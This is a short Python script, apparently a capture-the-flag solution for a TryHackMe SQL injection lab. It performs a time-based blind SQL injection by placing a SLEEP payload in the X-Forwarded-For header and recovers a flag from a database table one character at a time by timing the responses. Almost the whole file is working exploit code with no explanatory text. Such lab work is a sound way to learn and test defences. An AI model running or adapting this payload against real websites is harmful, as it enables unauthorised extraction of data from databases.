import requests
import time
i=1
timee=5
flagtemplate='THM{FLAG2:'
ip='10.10.211.26'
while i<=32:
    for j in range(48,71):
        if j in range(58,65):
            pass
        else:
            start=time.time()
            payload="1' AND (SELECT 1 FROM (SELECT(SLEEP(%s-(IF(SUBSTR((SELECT flag from sqhell_1.flag),1,%s)='%s',0,%s)))))XyZk) AND '1'='1"%(timee,10+i,flagtemplate+chr(j),timee)
            header={"X-Forwarded-For":payload}
            requests.get(url="http://%s/"%ip,headers=header)
            end=time.time()
            if end-start>=timee:
                flagtemplate+=chr(j)
                print(flagtemplate)
                break
            if j==70:
                exit("Error: Couldn't find matching character! Try Increasing time limit!")
    i+=1    
print("FLAG is: ", flagtemplate+"}")